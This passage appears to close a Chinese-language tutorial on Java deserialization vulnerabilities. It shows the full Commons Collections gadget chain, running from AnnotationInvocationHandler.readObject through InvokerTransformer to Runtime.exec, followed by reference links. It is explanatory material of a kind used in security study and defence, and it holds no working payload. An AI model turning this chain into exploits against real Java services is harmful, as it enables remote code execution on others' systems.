![](https://prod-files-secure.s3.us-west-2.amazonaws.com/67fdb170-fbbe-4acc-adb2-bfe5483404bd/922b91e1-6476-45c7-8cfb-cf08f4d0beb5/11.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=AKIAT73L2G45HZZMZUHI%2F20241006%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20241006T050158Z&X-Amz-Expires=3600&X-Amz-Signature=88b17c6758aa506e81b24e2d8b1e672a86b5b6982204dfcce85dbca5226c246c&X-Amz-SignedHeaders=host&x-id=GetObject)

完整 Gadget 调用链如下。

```text
AnnotationInvocationHandler.readObject()
   Map(Proxy).entrySet()
        AnnotationInvocationHandler.invoke()
            TransformedMap.setValue()
                ChainedTransformer.transform()
                    ConstantTransformer.transform()
                    InvokerTransformer.transform()
                        Method.invoke()
                            Class.getMethod()
                    InvokerTransformer.transform()
                        Method.invoke()
                            Runtime.getRuntime()
                    InvokerTransformer.transform()
                        Method.invoke()
                            Runtime.exec()
```

## 参考

- [https://0xf4n9x.github.io/java-deserialization-vulnerability-principle](https://0xf4n9x.github.io/java-deserialization-vulnerability-principle)
- [https://www.slideshare.net/codewhitesec/exploiting-deserialization-vulnerabilities-in-java-54707478](https://www.slideshare.net/codewhitesec/exploiting-deserialization-vulnerabilities-in-java-54707478)
- [https://foxglovesecurity.com/2015/11/06/what-do-weblogic-websphere-jboss-jenkins-opennms-and-your-application-have-in-common-this-vulnerability/](https://foxglovesecurity.com/2015/11/06/what-do-weblogic-websphere-jboss-jenkins-opennms-and-your-application-have-in-common-this-vulnerability/)
- [https://www.javasec.org/javase/JavaDeserialization/Collections.html](https://www.javasec.org/javase/JavaDeserialization/Collections.html)
